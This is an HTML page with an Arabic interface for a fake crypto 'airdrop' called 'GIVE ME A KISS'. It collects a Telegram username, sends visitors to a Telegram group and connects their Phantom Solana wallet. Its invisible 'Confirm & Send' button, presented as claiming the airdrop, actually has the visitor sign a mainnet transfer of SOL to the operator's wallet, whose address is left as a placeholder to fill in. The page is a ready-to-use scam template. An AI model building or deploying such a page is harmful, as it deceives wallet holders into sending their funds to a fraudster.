<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GIVE ME A KISS - Airdrop</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #fbc2eb;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden;
        }

        /* حاوية التصميم الرئيسية */
        .main-container {
            position: relative;
            width: 380px;
            height: 600px;
            /* تم وضع اسم الصورة الكامل مع تعديل الرقم إلى 43 */
            background: url('assets/unnamed (43).jpg') no-repeat center top;
            background-size: contain;
            border-radius: 40px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.2);
        }

        /* وضع العناصر فوق الصورة بدقة */
        .overlay-content {
            position: absolute;
            top: 255px; 
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* خانة التليجرام */
        .input-tg {
            width: 255px;
            height: 38px;
            border-radius: 20px;
            border: 2px solid #00d2ff;
            text-align: center;
            outline: none;
            margin-bottom: 12px;
            font-size: 14px;
            font-weight: bold;
        }

        /* خانة المحفظة وزر التحقق */
        .wallet-wrapper {
            position: relative;
            width: 255px;
            margin-bottom: 15px;
        }

        .input-wallet {
            width: 100%;
            height: 38px;
            border-radius: 20px;
            border: 1px solid #ccc;
            padding: 0 15px;
            box-sizing: border-box;
            font-size: 11px;
            background: rgba(255,255,255,0.9);
            text-align: left;
        }

        /* زر التحقق الأحمر الصغير */
        .btn-check-red {
            position: absolute;
            left: 4px;
            top: 4px;
            background: #f04a8a;
            color: white;
            border: none;
            padding: 6px 15px;
            border-radius: 15px;
            font-size: 11px;
            cursor: pointer;
            font-weight: bold;
            text-decoration: none;
            display: flex;
            align-items: center;
        }

        /* أزرار شفافة فوق أزرار الصورة الأصلية */
        .invisible-btn {
            width: 255px;
            background: transparent;
            border: none;
            cursor: pointer;
            z-index: 10;
        }

        .btn-connect-phantom { height: 48px; margin-top: 5px; }
        .btn-confirm-send { height: 55px; margin-top: 15px; }

        #status-msg {
            color: #444;
            font-size: 11px;
            margin-top: 10px;
            text-align: center;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="main-container">
    <div class="overlay-content">
        <input type="text" id="tgUser" class="input-tg" placeholder="@Telegram_Username">
        
        <div class="wallet-wrapper">
            <input type="text" id="walletAddr" class="input-wallet" placeholder="walletAddress" readonly>
            <a href="https://t.me/G_M_A_KISS_1" target="_blank" class="btn-check-red" id="checkBtn">للتحقق</a>
        </div>

        <button class="invisible-btn btn-connect-phantom" id="connectBtn" title="Connect Wallet"></button>
        <button class="invisible-btn btn-confirm-send" id="claimBtn" title="Confirm & Send"></button>

        <div id="status-msg">انضم للمجموعة ثم تفقد رسائل الخاص للعودة ✅</div>
    </div>
</div>

<script>
    // --- إعدادات المحفظة ---
    const MY_WALLET = "ضع_هنا_عنوان_محفظتك_الخاصة"; 

    // زر التحقق
    document.getElementById('checkBtn').onclick = function() {
        const user = document.getElementById('tgUser').value.trim();
        if (!user) { 
            alert("يرجى إدخال اسم المستخدم أولاً!"); 
            return false; 
        }
        document.getElementById('status-msg').innerText = "تم فتح المجموعة.. تفقد الخاص بعد الانضمام للعودة";
        document.getElementById('status-msg').style.color = "blue";
        return true; 
    };

    // ربط محفظة Phantom
    document.getElementById('connectBtn').onclick = async () => {
        if (window.solana) {
            try {
                const resp = await window.solana.connect();
                document.getElementById('walletAddr').value = resp.publicKey.toString().slice(0,25) + "...";
                document.getElementById('status-msg').innerText = "المحفظة متصلة ✅";
                document.getElementById('status-msg').style.color = "green";
            } catch (err) { console.log("Rejected"); }
        } else { alert("يرجى تثبيت محفظة Phantom"); }
    };

    // عملية الإرسال
    document.getElementById('claimBtn').onclick = async () => {
        const wallet = document.getElementById('walletAddr').value;
        if (!wallet || wallet === "walletAddress") { alert("اربط المحفظة أولاً!"); return; }

        try {
            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: window.solana.publicKey,
                    toPubkey: new solanaWeb3.PublicKey(MY_WALLET),
                    lamports: 0.0006 * solanaWeb3.LAMPORTS_PER_SOL,
                })
            );

            let { blockhash } = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = window.solana.publicKey;

            const signed = await window.solana.signTransaction(transaction);
            await connection.sendRawTransaction(signed.serialize());
            alert("✅ تم إرسال الطلب بنجاح!");
        } catch (err) { alert("تأكد من وجود رصيد كافٍ للرسوم."); }
    };
</script>

</body>
</html>
